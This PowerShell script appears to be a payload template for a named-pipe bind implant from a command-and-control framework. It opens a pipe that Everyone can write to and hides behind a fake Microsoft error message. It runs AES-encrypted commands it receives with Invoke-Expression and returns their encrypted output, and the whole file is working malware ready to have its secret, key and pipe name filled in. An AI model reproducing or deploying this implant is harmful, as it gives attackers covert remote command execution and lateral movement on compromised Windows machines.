function Create-AesManagedObject
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )
    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV)
    {
        if ($IV.getType().Name -eq 'String')
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else
        {$aesManaged.IV = $IV}
    }
    if ($key)
    {
        if ($key.getType().Name -eq 'String')
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

function Encrypt-String
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}
function Decrypt-String
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function invoke-pserv {
param ($secret, $key, $pname)

add-Type -assembly 'System.Core'
$PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
$AccessRule = New-Object System.IO.Pipes.PipeAccessRule( 'Everyone', 'ReadWrite', 'Allow' )
$PipeSecurity.AddAccessRule($AccessRule)
$Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pname,'InOut',100, 'Byte', 'None', 4096, 4096, $PipeSecurity)

try {
    'Waiting for client connection'
    $pipe.WaitForConnection()
    'Connection established'

    $pipeReader = new-object System.IO.StreamReader($pipe)
    $pipeWriter = new-object System.IO.StreamWriter($pipe)
    $pipeWriter.AutoFlush = $true

    $PPass = $pipeReader.ReadLine()


    while (1)
    {
        if ($PPass -ne $secret) {
            $pipeWriter.WriteLine('Microsoft Error: 151337')
        }

        else {

            while (1) {
                $encCommand = Encrypt-String -unencryptedString 'COMMAND' -Key $key
                $pipeWriter.WriteLine($encCommand)

                $command = $pipeReader.ReadLine()
                $decCommand = Decrypt-String -key $key -encryptedStringWithIV $command

                if ($deccommand) {
                    try {
                        $error.clear()
                        if ($decCommand -eq 'KILLPIPE'){exit}
                        $res = Invoke-Expression $decCommand | out-string
                        $StdError = ($error[0] | Out-String)
                        if ($StdError){
                          $res = $res + $StdError
                        }
                        if ($res -eq ""){$res = "No output from command"}
                        $res = $res + '123456PS ' + (Get-Location).Path + '>654321'
                    } catch {
                        $res = 'ErrorUpload: ' + $error[0]
                        $res = $res + '123456PS ' + (Get-Location).Path + '>654321'
                    }
                    $fileContentBytes = [System.Text.Encoding]::Unicode.GetBytes($res)
                    $res = [System.Convert]::ToBase64String($fileContentBytes)
                    $encCommand2 = Encrypt-String -unencryptedString $res -Key $key
                    $pipeWriter.WriteLine($encCommand2)
                    $pipeWriter.Flush()
                }
                elseif (!$decCommand) {
                    $encbad = Encrypt-String -unencryptedString 'This should never fire! - crypto failure' -Key $key
                    $pipeWriter.WriteLine($encbad)
                    break
                }

            }
        }
        $encGo = Encrypt-String -unencryptedString 'GOAGAIN' -Key $key
        $pipeWriter.WriteLine($encGo)
        $encSure = Encrypt-String -unencryptedString 'SURE' -Key $key
        $pipeWriter.WriteLine($encSure)
        $command = $pipeReader.ReadLine()
        $decCommand = Decrypt-String -key $key -encryptedStringWithIV $command
        if ($decCommand -eq 'EXIT') { break }
    }

    Start-Sleep -Seconds 2
}
finally {
    $pipe.Dispose()
}
}
invoke-pserv -secret #REPLACEPBINDSECRET# -key #REPLACEKEY# -pname #REPLACEPBINDPIPENAME#
